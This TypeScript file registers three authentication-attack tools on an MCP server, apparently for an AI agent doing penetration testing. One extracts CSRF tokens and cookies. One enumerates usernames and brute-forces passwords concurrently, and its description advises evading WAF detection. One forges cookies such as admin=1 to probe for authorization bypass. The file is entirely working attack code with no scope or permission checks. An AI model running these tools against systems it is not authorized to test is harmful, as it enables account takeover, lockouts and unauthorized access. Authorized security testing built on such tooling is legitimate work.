/**
 * Authentication Testing tools.
 *
 * CSRF token extraction, credential brute-force, cookie tampering.
 */

import { McpServer } from "@modelcontextprotocol/sdk/server/mcp.js";
import { z } from "zod";
import { runCmd, requireTool } from "../runner.js";

export function register(server: McpServer): void {
  server.tool(
    "auth_csrf_extract",
    "Extract CSRF tokens from HTML forms.\n\nSearches for the token in hidden input fields, meta tags, and script blocks.\n\nReturns: {\"tokens_found\": [{\"source\": str, \"value\": str}], \"cookies\": [str]}.\n\nSide effects: Single GET request.",
    {
      url: z
        .string()
        .describe("URL of the form page containing CSRF token"),
      token_name: z
        .string()
        .describe("CSRF token field name to search for")
        .optional(),
    },
    async ({ url, token_name = "csrf" }) => {
      requireTool("curl");

      // Fetch the page and save cookies
      const res = await runCmd("curl", ["-sk", "-D", "-", "-c", "-", url]);

      const body = res.stdout;
      const tokens: Array<{ source: string; value: string }> = [];

      const escapedName = token_name.replace(/[.*+?^${}()|[\]\\]/g, "\\$&");

      // Hidden input fields (name before value)
      const inputPattern = new RegExp(
        `name=["']?${escapedName}["']?\\s+value=["']([^"']+)["']`,
        "gi"
      );
      for (const match of body.matchAll(inputPattern)) {
        tokens.push({ source: "hidden_input", value: match[1] });
      }

      // Value before name pattern
      const valueFirstPattern = new RegExp(
        `value=["']([^"']+)["']\\s+name=["']?${escapedName}["']?`,
        "gi"
      );
      for (const match of body.matchAll(valueFirstPattern)) {
        tokens.push({ source: "hidden_input_v2", value: match[1] });
      }

      // Meta tag
      const metaPattern = new RegExp(
        `<meta\\s+name=["']?${escapedName}["']?\\s+content=["']([^"']+)["']`,
        "gi"
      );
      for (const match of body.matchAll(metaPattern)) {
        tokens.push({ source: "meta_tag", value: match[1] });
      }

      // URL parameter in form action
      const actionPattern = new RegExp(
        `${escapedName}=([^&"'>\\s]+)`,
        "g"
      );
      for (const match of body.matchAll(actionPattern)) {
        tokens.push({ source: "url_param", value: match[1] });
      }

      // Extract cookies
      const cookieLines = body
        .split("\n")
        .filter(
          (line) =>
            line.startsWith("Set-Cookie:") ||
            line.startsWith("set-cookie:")
        );

      const result = {
        tokens_found: tokens,
        token_count: tokens.length,
        cookies: cookieLines.slice(0, 10),
      };

      return { content: [{ type: "text", text: JSON.stringify(result) }] };
    }
  );

  server.tool(
    "auth_bruteforce",
    "Username enumeration and credential brute-force.\n\nFirst enumerates valid usernames (if failure messages differ), then brute-forces passwords against confirmed usernames.\n\nReturns: {\"username_enumeration\": [{\"username\": str, \"exists\": bool}], \"valid_credentials\": [{\"username\": str, \"password\": str}], \"requests_sent\": int}.\n\nSide effects: Sends login requests. May trigger account lockout.\n\nErrors: Rate limiting may block requests. Use realistic credentials to avoid WAF detection.",
    {
      url: z.string().describe("Login form URL"),
      usernames: z
        .array(z.string())
        .min(1)
        .max(50)
        .describe("Usernames to test"),
      passwords: z
        .array(z.string())
        .min(1)
        .max(100)
        .describe("Passwords to test"),
      username_field: z
        .string()
        .describe("Form field name for username")
        .optional(),
      password_field: z
        .string()
        .describe("Form field name for password")
        .optional(),
      method: z
        .enum(["POST", "GET"])
        .describe("HTTP method")
        .optional(),
      success_indicator: z
        .string()
        .optional()
        .describe(
          "String in response that indicates success (e.g. 'dashboard', 'welcome')"
        ),
      failure_indicator: z
        .string()
        .optional()
        .describe(
          "String in response that indicates failure (e.g. 'invalid', 'incorrect')"
        ),
      content_type: z
        .enum(["form", "json"])
        .describe("Request content type")
        .optional(),
      concurrent: z
        .number()
        .min(1)
        .max(10)
        .describe("Concurrent requests")
        .optional(),
    },
    async ({
      url,
      usernames,
      passwords,
      username_field = "username",
      password_field = "password",
      method = "POST",
      success_indicator,
      failure_indicator,
      content_type = "form",
      concurrent = 3,
    }) => {
      requireTool("curl");

      // Phase 1: Username enumeration
      const enumResults: Array<{
        username: string;
        status: number;
        response_length: number;
        response_snippet: string;
        likely_exists?: boolean | null;
      }> = [];
      const responseLengths: Record<string, number> = {};

      for (const user of usernames) {
        let curlArgs: string[];
        if (content_type === "json") {
          const data = JSON.stringify({
            [username_field]: user,
            [password_field]: "definitely_wrong_12345",
          });
          curlArgs = [
            "-sk",
            "-o",
            "-",
            "-w",
            "\n__META__%{http_code}:%{size_download}",
            "-X",
            "POST",
            "-H",
            "Content-Type: application/json",
            "-d",
            data,
            url,
          ];
        } else {
          curlArgs = [
            "-sk",
            "-o",
            "-",
            "-w",
            "\n__META__%{http_code}:%{size_download}",
            "-X",
            method,
            "-d",
            `${username_field}=${user}&${password_field}=definitely_wrong_12345`,
            url,
          ];
        }

        const res = await runCmd("curl", curlArgs);
        let body = res.stdout;
        const metaMarker = body.lastIndexOf("__META__");
        let status = 0;
        let length = 0;
        if (metaMarker !== -1) {
          const meta = body.slice(metaMarker + 8).trim();
          const parts = meta.split(":");
          status = parts[0] ? parseInt(parts[0], 10) : 0;
          length = parts[1] ? parseInt(parts[1], 10) : 0;
          body = body.slice(0, metaMarker);
        }

        responseLengths[user] = length;
        enumResults.push({
          username: user,
          status,
          response_length: length,
          response_snippet: body.slice(0, 200),
        });
      }

      // Detect enumeration: if response lengths vary, some usernames likely exist
      const lengths = Object.values(responseLengths);
      if (new Set(lengths).size > 1) {
        // Most common length is the "user not found" length
        const freq: Record<number, number> = {};
        for (const l of lengths) {
          freq[l] = (freq[l] ?? 0) + 1;
        }
        const commonLength = Number(
          Object.entries(freq).sort((a, b) => b[1] - a[1])[0][0]
        );
        for (const entry of enumResults) {
          entry.likely_exists = entry.response_length !== commonLength;
        }
      } else {
        for (const entry of enumResults) {
          entry.likely_exists = null; // Can't determine
        }
      }

      // Phase 2: Credential brute-force
      const validCreds: Array<{
        username: string;
        password: string;
        status: number;
      }> = [];
      let requestsSent = usernames.length;
      let failureIndicatorFound = false;

      async function tryCred(
        user: string,
        passwd: string
      ): Promise<{ username: string; password: string; status: number } | null> {
        let curlArgs: string[];
        if (content_type === "json") {
          const data = JSON.stringify({
            [username_field]: user,
            [password_field]: passwd,
          });
          curlArgs = [
            "-sk",
            "-o",
            "-",
            "-w",
            "\n__META__%{http_code}:%{size_download}:%{redirect_url}",
            "-X",
            "POST",
            "-H",
            "Content-Type: application/json",
            "-d",
            data,
            url,
          ];
        } else {
          curlArgs = [
            "-sk",
            "-o",
            "-",
            "-w",
            "\n__META__%{http_code}:%{size_download}:%{redirect_url}",
            "-X",
            method,
            "-d",
            `${username_field}=${user}&${password_field}=${passwd}`,
            url,
          ];
        }

        const res = await runCmd("curl", curlArgs);
        let body = res.stdout;
        const metaMarker = body.lastIndexOf("__META__");
        let status = 0;
        let redirect = "";
        if (metaMarker !== -1) {
          const meta = body.slice(metaMarker + 8).trim();
          const parts = meta.split(":");
          status = parts[0] ? parseInt(parts[0], 10) : 0;
          redirect = parts[2] ?? "";
          body = body.slice(0, metaMarker);
        }

        // Check success/failure
        let isSuccess = false;
        if (success_indicator && body.toLowerCase().includes(success_indicator.toLowerCase())) {
          isSuccess = true;
        } else if (failure_indicator) {
          if (body.toLowerCase().includes(failure_indicator.toLowerCase())) {
            failureIndicatorFound = true;
          } else {
            isSuccess = true;
          }
        } else if ([301, 302, 303].includes(status) && redirect) {
          isSuccess = true;
        }

        if (isSuccess) {
          return { username: user, password: passwd, status };
        }
        return null;
      }

      // Brute-force in batches
      const tasks: Array<[string, string]> = [];
      for (const user of usernames) {
        for (const passwd of passwords) {
          tasks.push([user, passwd]);
        }
      }

      for (let i = 0; i < tasks.length; i += concurrent) {
        const batch = tasks.slice(i, i + concurrent);
        const batchResults = await Promise.all(
          batch.map(([u, p]) => tryCred(u, p))
        );
        requestsSent += batch.length;
        for (const result of batchResults) {
          if (result) {
            validCreds.push(result);
          }
        }
      }

      const result: Record<string, unknown> = {
        username_enumeration: enumResults,
        valid_credentials: validCreds,
        requests_sent: requestsSent,
      };

      if (failure_indicator && !failureIndicatorFound) {
        result["warning"] =
          "failure_indicator not found in any response - results may be unreliable";
      }

      return { content: [{ type: "text", text: JSON.stringify(result) }] };
    }
  );

  server.tool(
    "auth_cookie_tamper",
    "Test cookie manipulation for privilege escalation.\n\nSends requests with tampered cookie values and checks for access.\n\nReturns: {\"results\": [{\"cookies\": dict, \"status\": int, \"length\": int, \"response_snippet\": str}]}.\n\nSide effects: Sends GET requests with manipulated cookies.",
    {
      url: z
        .string()
        .describe(
          "URL to test with tampered cookies (e.g. /dashboard, /admin)"
        ),
      cookies: z
        .record(z.string())
        .describe(
          "Cookie name-value pairs to send, e.g. {\"logged_in\": \"true\", \"admin\": \"1\"}"
        ),
    },
    async ({ url, cookies }) => {
      requireTool("curl");

      // Build cookie string
      const cookieStr = Object.entries(cookies)
        .map(([k, v]) => `${k}=${v}`)
        .join("; ");

      // Test with tampered cookies
      const res = await runCmd("curl", [
        "-sk",
        "-o",
        "-",
        "-w",
        "\n__META__%{http_code}:%{size_download}",
        "-b",
        cookieStr,
        url,
      ]);

      let body = res.stdout;
      const metaMarker = body.lastIndexOf("__META__");
      let status = 0;
      let length = 0;
      if (metaMarker !== -1) {
        const meta = body.slice(metaMarker + 8).trim();
        const parts = meta.split(":");
        status = parts[0] ? parseInt(parts[0], 10) : 0;
        length = parts[1] ? parseInt(parts[1], 10) : 0;
        body = body.slice(0, metaMarker);
      }

      // Also test without cookies for comparison
      const baseline = await runCmd("curl", [
        "-sk",
        "-o",
        "/dev/null",
        "-w",
        "%{http_code}:%{size_download}",
        url,
      ]);
      const bp = baseline.stdout.split(":");
      const baseStatus = bp[0] ? parseInt(bp[0], 10) : 0;
      const baseLength = bp[1] ? parseInt(bp[1], 10) : 0;

      const result = {
        tampered_request: {
          cookies,
          status,
          length,
          response_snippet: body.slice(0, 1000),
        },
        baseline_request: {
          status: baseStatus,
          length: baseLength,
        },
        access_changed:
          status !== baseStatus || Math.abs(length - baseLength) > 50,
        hint: "If status/length differ significantly, cookie-based auth bypass may be possible.",
      };

      return { content: [{ type: "text", text: JSON.stringify(result) }] };
    }
  );
}
